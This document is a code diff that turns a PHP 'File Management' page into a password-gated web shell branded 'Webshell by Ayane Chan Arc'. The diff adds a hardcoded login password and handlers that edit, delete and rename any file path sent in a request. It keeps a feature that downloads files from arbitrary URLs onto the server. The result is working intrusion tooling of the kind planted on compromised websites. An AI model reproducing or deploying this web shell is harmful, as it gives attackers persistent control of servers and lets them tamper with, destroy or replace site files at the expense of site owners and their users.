@@ -1,4 +1,19 @@
 <?php
+session_start();
+
+// Fitur Password
+$password = 'ayane111'; // Ganti dengan password yang diinginkan
+$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if ($_POST['password'] === $password) {
+        $_SESSION['authenticated'] = true;
+        $isAuthenticated = true;
+    } else {
+        echo "<div class='alert alert-danger'>Incorrect password.</div>";
+    }
+}
+
 // Fungsi untuk mengunduh file dari URL dan menyimpannya ke direktori yang dipilih
 function uploadFromUrl($url, $saveTo) {
     $fileContent = file_get_contents($url);
@@ -37,9 +52,16 @@ function display_path_links($dir) {
             echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
             echo "<span>$file</span>";
             echo "<form method='post' style='display:inline;'>";
-            echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<input type='text' name='destination' class='form-control-sm' placeholder='New path'>";
-            echo "<button type='submit' class='btn btn-warning btn-sm ml-2'>Move</button>";
+            echo "<input type='hidden' name='edit' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
+            echo "<button type='submit' class='btn btn-primary btn-sm ml-2'>Edit</button>";
+            echo "</form>";
+            echo "<form method='post' style='display:inline;'>";
+            echo "<input type='hidden' name='delete' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
+            echo "<button type='submit' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "</form>";
+            echo "<form method='post' style='display:inline;'>";
+            echo "<input type='hidden' name='rename' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
+            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' onclick=\"document.getElementById('rename-form').style.display='block'\">Rename</button>";
             echo "</form>";
             echo "</div>";
         }
@@ -48,12 +70,30 @@ function display_path_links($dir) {
     }
 }
 
-// Fungsi untuk memindahkan file
-function moveFile($source, $destination) {
-    if (rename($source, $destination)) {
-        echo "<div class='alert alert-success'>File moved successfully.</div>";
+// Fungsi untuk mengedit file
+function editFile($filePath, $newContent) {
+    if (file_put_contents($filePath, $newContent) !== false) {
+        echo "<div class='alert alert-success'>File edited successfully.</div>";
     } else {
-        echo "<div class='alert alert-danger'>Failed to move file.</div>";
+        echo "<div class='alert alert-danger'>Failed to edit file.</div>";
+    }
+}
+
+// Fungsi untuk menghapus file
+function deleteFile($filePath) {
+    if (unlink($filePath)) {
+        echo "<div class='alert alert-success'>File deleted successfully.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Failed to delete file.</div>";
+    }
+}
+
+// Fungsi untuk mengubah nama file
+function renameFile($oldPath, $newPath) {
+    if (rename($oldPath, $newPath)) {
+        echo "<div class='alert alert-success'>File renamed successfully.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Failed to rename file.</div>";
     }
 }
 
@@ -67,11 +107,25 @@ if (isset($_POST['url']) && isset($_POST['dir'])) {
     uploadFromUrl($url, $savePath);
 }
 
-// Menangani pemindahan file
-if (isset($_POST['source']) && isset($_POST['destination'])) {
-    $source = $_POST['source'];
-    $destination = $_POST['destination'];
-    moveFile($source, $destination);
+// Menangani pengeditan file
+if (isset($_POST['edit']) && isset($_POST['content'])) {
+    $file = $_POST['edit'];
+    $content = $_POST['content'];
+    editFile($file, $content);
+}
+
+// Menangani penghapusan file
+if (isset($_POST['delete'])) {
+    $file = $_POST['delete'];
+    deleteFile($file);
+}
+
+// Menangani perubahan nama file
+if (isset($_POST['rename']) && isset($_POST['newName'])) {
+    $oldPath = $_POST['rename'];
+    $newName = $_POST['newName'];
+    $newPath = dirname($oldPath) . '/' . $newName;
+    renameFile($oldPath, $newPath);
 }
 
 // Menentukan direktori saat ini atau yang dipilih
@@ -87,49 +141,163 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Management</title>
+    <title>Webshell by Ayane Chan Arc</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .btn-link {
+            color: #e91e63;
+        }
+        .btn-link:hover {
+            color: #c2185b;
+        }
+        .btn-primary {
+            background-color: #e91e63;
+            border-color: #e91e63;
+        }
+        .btn-primary:hover {
+            background-color: #c2185b;
+            border-color: #c2185b;
+        }
+        .btn-secondary {
+            background-color: #9e9e9e;
+            border-color: #9e9e9e;
+        }
+        .btn-secondary:hover {
+            background-color: #757575;
+            border-color: #757575;
+        }
+        .btn-danger {
+            background-color: #f44336;
+            border-color: #f44336;
+        }
+        .btn-danger:hover {
+            background-color: #c62828;
+            border-color: #c62828;
+        }
+        .alert-success {
+            background-color: #4caf50;
+            color: #ffffff;
+        }
+        .alert-danger {
+            background-color: #f44336;
+            color: #ffffff;
+        }
+    </style>
 </head>
 <body>
     <div class="container mt-5">
-        <h1 class="mb-4">File Management</h1>
+        <?php if (!$isAuthenticated): ?>
+            <form method="post">
+                <div class="form-group">
+                    <label for="password">Enter Password</label>
+                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        <?php else: ?>
+            <h1 class="mb-4">Webshell by Ayane Chan Arc</h1>
 
-        <h2>Upload File to Current Directory</h2>
-        <form method="post">
-            <div class="form-group">
-                <label for="url">File URL</label>
-                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+            <!-- Navigasi Direktori -->
+            <div class="mb-4">
+                <nav aria-label="breadcrumb">
+                    <ol class="breadcrumb">
+                        <li class="breadcrumb-item"><a href="?dir=">/</a></li>
+                        <?php foreach ($dirArray as $key => $dirPart): ?>
+                            <?php $path = implode(DIRECTORY_SEPARATOR, array_slice($dirArray, 0, $key + 1)); ?>
+                            <li class="breadcrumb-item">
+                                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($dirPart); ?></a>
+                            </li>
+                        <?php endforeach; ?>
+                    </ol>
+                </nav>
             </div>
-            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
-            <button type="submit" class="btn btn-primary">Upload from URL</button>
-        </form>
 
-        <h2 class="mt-4">Directory Listing</h2>
-        <div class="alert alert-info">
-            <strong>Current Directory:</strong> 
-            <?php
-            // Menampilkan path direktori sebagai link
-            $currentPath = '/'; // Mulai dengan root
-            echo "<a href='?dir=' class='btn btn-link'>/</a> ";
-            foreach ($dirArray as $index => $folder) {
-                $currentPath .= htmlspecialchars($folder) . '/';
-                $encodedPath = urlencode($currentPath);
-                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
-                if ($index < count($dirArray) - 1) {
-                    echo " / ";
+            <!-- Daftar Folder dan File -->
+            <div class="list-group">
+                <?php display_path_links($dir); ?>
+            </div>
+
+            <!-- Form untuk upload file dari URL -->
+            <div class="mt-4">
+                <h2>Upload File from URL</h2>
+                <form method="post">
+                    <div class="form-group">
+                        <label for="url">File URL</label>
+                        
+                                                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dir">Save Directory</label>
+                        <input type="text" id="dir" name="dir" class="form-control" value="<?php echo htmlspecialchars($displayDir); ?>" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Upload</button>
+                </form>
+            </div>
+
+            <!-- Form untuk edit file -->
+            <div class="mt-4">
+                <h2>Edit File</h2>
+                <?php if (isset($_POST['edit'])): ?>
+                    <?php $fileToEdit = htmlspecialchars($_POST['edit']); ?>
+                    <form method="post">
+                        <input type="hidden" name="edit" value="<?php echo $fileToEdit; ?>">
+                        <div class="form-group">
+                            <label for="content">File Content</label>
+                            <textarea id="content" name="content" class="form-control" rows="10"><?php echo htmlspecialchars(file_get_contents($fileToEdit)); ?></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Save Changes</button>
+                    </form>
+                <?php endif; ?>
+            </div>
+
+            <!-- Form untuk rename file -->
+            <div class="mt-4">
+                <h2>Rename File</h2>
+                <div id="rename-form" style="display:none;">
+                    <form method="post">
+                        <input type="hidden" name="rename" value="<?php echo isset($fileToRename) ? htmlspecialchars($fileToRename) : ''; ?>">
+                        <div class="form-group">
+                            <label for="newName">New Name</label>
+                            <input type="text" id="newName" name="newName" class="form-control" required>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Rename</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Form untuk upload file dari URL -->
+            <div class="mt-4">
+                <h2>Upload File from URL</h2>
+                <form method="post">
+                    <div class="form-group">
+                        <label for="url">File URL</label>
+                        <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dir">Save Directory</label>
+                        <input type="text" id="dir" name="dir" class="form-control" value="<?php echo htmlspecialchars($displayDir); ?>" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Upload</button>
+                </form>
+            </div>
+
+            <!-- Script untuk menangani tombol rename -->
+            <script>
+                function showRenameForm(filePath) {
+                    document.getElementById('rename-form').style.display = 'block';
+                    document.querySelector('input[name="rename"]').value = filePath;
                 }
-            }
-            ?>
-        </div>
-        <div class="list-group">
-            <?php
-            display_path_links($dir);
-            ?>
-        </div>
+            </script>
+        <?php endif; ?>
     </div>
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
